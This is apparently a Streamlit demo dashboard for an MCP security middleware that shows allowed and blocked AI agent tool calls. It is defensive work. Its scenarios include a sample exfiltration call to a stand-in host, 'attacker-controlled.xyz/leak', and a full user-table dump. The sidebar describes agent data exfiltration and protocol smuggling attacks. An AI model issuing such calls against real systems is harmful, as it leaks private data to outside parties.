import streamlit as st
import asyncio
import os
import sys
import json
import re
import hashlib
import time
import psutil
from datetime import datetime

# --- Windows Compatibility Fix ---
if os.name == 'nt':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except AttributeError:
        pass

# Path setup to find Lilith Zero SDK and middleware
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
sys.path.insert(0, os.path.join(ROOT_DIR, "sdk/src"))

try:
    from lilith_zero import Lilith
    from lilith_zero.exceptions import PolicyViolationError
except ImportError:
    st.error("Lilith Zero SDK not found. Build required.")
    st.stop()

# Constants
_EXT = ".exe" if os.name == "nt" else ""
LILITH_BINARY = os.path.join(ROOT_DIR, "lilith-zero/target/release/lilith-zero" + _EXT)
POLICY_PATH = os.path.join(os.path.dirname(__file__), "demo_policy.yaml")
SERVER_SCRIPT = os.path.join(os.path.dirname(__file__), "vulnerable_server.py")

# Helper functions for "Real Info"
def get_policy_hash():
    if not os.path.exists(POLICY_PATH): return "N/A"
    with open(POLICY_PATH, "rb") as f: return hashlib.sha256(f.read()).hexdigest()[:8].upper()

def get_resource_stats():
    process = psutil.Process(os.getpid())
    mem_mb = process.memory_info().rss / (1024 * 1024)
    cpu_pct = psutil.cpu_percent(interval=None)
    return f"CPU_{cpu_pct:.1f}%_MEM_{int(mem_mb)}MB"

# Page Config
st.set_page_config(
    page_title="LILITH ZERO | SECURITY CONTROLLER",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- THE "ULTRA CLEAN" RED TEAM THEME ---
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');

    html, body, [data-testid="stAppViewContainer"] {
        background-color: #030303;
        color: #e0e0e0;
        font-family: 'JetBrains Mono', monospace;
    }
    
    /* REMOVE ALL STREAMLIT DEFAULTS */
    header[data-testid="stHeader"] { display: none !important; }
    footer { display: none !important; }
    #MainMenu { display: none !important; }
    [data-testid="stToolbar"] { display: none !important; }
    
    .stMarkdown, .stText, p, h1, h2, h3, h4, label, .stRadio label {
        font-family: 'JetBrains Mono', monospace !important;
    }
    
    /* Robust fix for Streamlit icons */
    span[data-testid="stIcon"], i[class*="material-icons"], .st-emotion-cache-1vt4y6f {
        font-family: "Source Sans Pro", sans-serif !important;
    }

    /* Terminal Windows */
    .terminal-header {
        color: #ff3333;
        font-size: 0.75rem;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 25px;
        border-bottom: 1px solid #1a1a1a;
        padding-bottom: 12px;
        font-weight: 700;
    }

    .output-block {
        background: #080808;
        border: 1px solid #111;
        border-left: 2px solid #222;
        padding: 18px;
        font-size: 0.82rem;
        margin: 12px 0;
        line-height: 1.7;
        border-radius: 2px;
    }
    
    .status-denied { color: #ff3333; border-left-color: #ff3333; }
    .status-warning { color: #ff3333; border-left-color: #ff3333; }
    .status-allowed { color: #33ff66; border-left-color: #33ff66; }

    .stButton>button {
        background-color: #000;
        color: #fff;
        border: 1px solid #ff3333;
        border-radius: 2px;
        font-family: 'JetBrains Mono', monospace;
        letter-spacing: 1.5px;
        text-transform: uppercase;
        transition: all 0.25s ease;
        padding: 12px;
        font-size: 0.8rem;
    }
    .stButton>button:hover {
        background-color: #ff3333;
        color: #000 !important;
        box-shadow: 0 0 30px rgba(255, 51, 51, 0.4);
    }

    .stTextArea textarea {
        background-color: #050505 !important;
        color: #33ff66 !important;
        border: 1px solid #111 !important;
        font-family: 'JetBrains Mono', monospace !important;
        font-size: 0.8rem;
        border-radius: 2px;
    }
    
    .stRadio label { color: #555 !important; font-size: 0.85rem; }
    .stRadio div[data-testid="stMarkdownContainer"] p { color: #ccc !important; font-weight: 700; font-size: 0.9rem; }

    .step-log { color: #444; font-size: 0.72rem; margin: 3px 0; }
    .step-log-tag { color: #33ff66; font-weight: bold; }

    /* Sidebar Refinement */
    section[data-testid="stSidebar"] {
        background-color: #020202 !important;
        border-right: 1px solid #111;
    }
    section[data-testid="stSidebar"] h2 {
        color: #ff3333;
        font-size: 0.95rem;
        letter-spacing: 1px;
        border-bottom: 2px solid #1a1a1a;
        padding-bottom: 12px;
        margin-top: 35px;
        font-weight: 700;
    }
    .sec-card {
        background: #060606;
        border: 1px solid #111;
        padding: 15px;
        margin-bottom: 18px;
        border-left: 2px solid #ff3333;
    }
    .sec-tag {
        color: #ff3333;
        font-size: 0.65rem;
        font-weight: 700;
        text-transform: uppercase;
        margin-bottom: 8px;
        display: block;
    }
    .sec-desc { font-size: 0.75rem; color: #777; line-height: 1.5; }
</style>
""", unsafe_allow_html=True)

# --- SIDEBAR: SECURITY INTELLIGENCE ---
with st.sidebar:
    st.markdown("## SECURITY ADVISORY")
    sidebar_intel = [
        ("RLS_BYPASS", "Mitigates <b>CVE-2025-48757</b>. Lilith enforces argument-level predicates like mandatory aggregations before SQL execution."),
        ("AGENT_EXFILTRATION", "Blocks the <b>Lethal Trifecta</b>: (Private Access) + (Untrusted Source) + (Egress). Tracks session-bound taints."),
        ("JSON_SMUGGLING", "Enforces strict <b>Content-Length</b> framing to prevent protocol-level desynchronization and orchestration attacks.")
    ]
    for tag, desc in sidebar_intel:
        st.markdown(f'<div class="sec-card"><span class="sec-tag">{tag}</span><div class="sec-desc">{desc}</div></div>', unsafe_allow_html=True)

    st.markdown("## CORE ARCHITECTURE")
    sidebar_arch = [
        ("RUST_RUNTIME", "Standalone binary interposing at the transport layer, effectively creating a zero-trust execution boundary."),
        ("FAIL_CLOSED", "Fail-closed architecture ensure total session termination on any policy mismatch or internal processing error."),
        ("HMAC_SIGNING", "Every security decision is cryptographically signed using HMAC-SHA256, ensuring audit trail integrity.")
    ]
    for tag, desc in sidebar_arch:
        st.markdown(f'<div class="sec-card"><span class="sec-tag">TECH_STRENGTH: {tag}</span><div class="sec-desc">{desc}</div></div>', unsafe_allow_html=True)

# Header Module
st.markdown(f"""
    <div style='display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 60px; padding-top: 20px;'>
        <div>
            <h1 style='margin: 0; font-weight: 700; font-size: 2rem; letter-spacing: -2px;'>LILITH<span style='color: #ff3333;'>ZERO</span></h1>
            <p style='color: #444; font-size: 0.75rem; margin: 0; letter-spacing: 1px; font-weight: 700;'>SECURE MCP MIDDLEWARE // ARCHITECTURAL VERSION 0.1.1</p>
        </div>
        <div style='text-align: right;'>
            <p style='color: #ff3333; font-size: 0.8rem; margin: 0; font-weight: 700;'>[ SYSTEM: ONLINE ]</p>
            <p style='color: #444; font-size: 0.7rem; margin: 0; font-weight: 700;'>ENFORCEMENT MODE: ACTIVE</p>
        </div>
    </div>
""", unsafe_allow_html=True)

col_config, col_main = st.columns([1, 2], gap="large")

with col_config:
    st.markdown('<div class="terminal-header">Routing & Policy Config</div>', unsafe_allow_html=True)
    if os.path.exists(POLICY_PATH):
        with open(POLICY_PATH, "r") as f: pol_text = f.read()
        updated_pol = st.text_area("POL", value=pol_text, height=480, label_visibility="collapsed")
        if updated_pol != pol_text:
            if st.button("Commit Policy Change"):
                with open(POLICY_PATH, "w") as f: f.write(updated_pol)
                st.rerun()
    
    st.markdown(f"""
        <div style='color: #333; font-size: 0.65rem; margin-top: 30px; line-height: 2;'>
            UPSTREAM_TYPE: PYTHON_MCP<br>
            SANDBOX_TIER: 2 (RESTRICTED)<br>
            ISOLATION_ENGINE: RUST_L3Z_CORE<br>
            PROCESS_PID: {os.getpid()}
        </div>
    """, unsafe_allow_html=True)

with col_main:
    st.markdown('<div class="terminal-header">Security Controller // Live Intercept</div>', unsafe_allow_html=True)
    scenario = st.radio("CONTEXT:", ["WITHOUT LILITH", "DUMP DB TABLE", "EXFILTRATION ATTEMPT", "AUTHORIZED QUERY"], label_visibility="collapsed")
    st.markdown("<br>", unsafe_allow_html=True)
    
    if st.button("Execute Intent"):
        log_ph, out_ph, steps = st.empty(), st.container(), []
        def log(msg):
            steps.append(f"<div class='step-log'><span class='step-log-tag'>[INFO]</span> {msg}</div>")
            log_ph.markdown("".join(steps), unsafe_allow_html=True); time.sleep(0.25)

        if "WITHOUT" in scenario:
            for m in ["Initializing direct access...", "Bypassing security middleware...", "Exposing legacy endpoint..."]: log(m)
            with out_ph:
                st.markdown(f"""
                    <div class="output-block status-warning">
                        <span style='font-size: 0.7rem; font-weight: bold; color: #ff3333;'>WARNING: SECURITY_DISABLED</span><br>
                        Baseline mode operates outside of the protected security perimeter.
                    </div>
                    <div class="output-block">
                        <span style='font-size: 0.7rem; color: #444;'>UPSTREAM_RESPONSE:</span><br>
                        <code>[{{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}}]</code>
                    </div>
                """, unsafe_allow_html=True)
        else:
            async def run_intercept(t, a):
                try:
                    for m in ["Mapping security policy...", f"Verifying {os.path.basename(LILITH_BINARY)}..."]: log(m)
                    async with Lilith(upstream=f"{sys.executable} {SERVER_SCRIPT}", policy=POLICY_PATH, binary=LILITH_BINARY) as client:
                        for m in ["Spawning isolation supervisor...", "MCP Handshake established.", "Context-aware session active.", f"Intercepting: {t}({json.dumps(a)})"]: log(m)
                        start = datetime.now()
                        res = await client.call_tool(t, a)
                        lat = (datetime.now() - start).total_seconds() * 1000
                        log("Evaluation: ALLOWED")
                        txt = re.sub(r'<<<LILITH_ZERO_DATA_.*>>>', '', res['content'][0]['text']).strip()
                        out_ph.markdown(f"""
                            <div class="output-block status-allowed">
                                <span style='font-size: 0.7rem; font-weight: bold;'>SUCCESS: POLICY_COMPLIANT</span><br>
                                Request validated and passed through security runtime ({lat:.1f}ms).
                            </div><div class="output-block">{txt}</div>
                        """, unsafe_allow_html=True)
                except PolicyViolationError as e:
                    log("Evaluation: DENIED"); err = str(e).split(" (context: ")[0]
                    out_ph.markdown(f"""
                        <div class="output-block status-denied">
                            <span style='font-size: 0.7rem; font-weight: bold;'>INTERVENE: POLICY_VIOLATION</span><br>
                            Illegal intent detected and nullified at the transport layer.
                        </div><div class="output-block"><span style='font-size: 0.7rem; color: #444;'>DENIAL_REASON:</span><br>{err}</div>
                    """, unsafe_allow_html=True)
                except Exception as e: st.error(f"RUNTIME_EXCEPTION: {e}")

            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            ops = {"DUMP DB TABLE": ("execute_sql", {"query": "SELECT * FROM users"}), 
                   "EXFILTRATION ATTEMPT": ("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}), 
                   "AUTHORIZED QUERY": ("execute_sql", {"query": "SELECT COUNT(*) FROM users"})}
            if scenario in ops: loop.run_until_complete(run_intercept(*ops[scenario]))
            loop.close()

    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown('<div class="terminal-header">Logic Trail & Resource State</div>', unsafe_allow_html=True)
    st.markdown(f"<div style='font-size: 0.65rem; color: #222; font-weight: 700;'>[ {datetime.now().strftime('%H:%M:%S')} ] KERNEL_STATUS: UP<br>[ {datetime.now().strftime('%H:%M:%S')} ] POLICY_HASH: {get_policy_hash()}<br>[ {datetime.now().strftime('%H:%M:%S')} ] RESOURCES: {get_resource_stats()}</div>", unsafe_allow_html=True)

# Footer
st.markdown("""
<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #111; font-weight: 700; letter-spacing: 1px;'>
    <div>LILITH_ZERO_CORE // BUILT_WITH_RUST</div>
    <div>ZERO_TRUST_MCP_ADAPTER</div>
    <div>AUTHENTICITY_VERIFIED_BAD_COMPANY</div>
</div>
""", unsafe_allow_html=True)
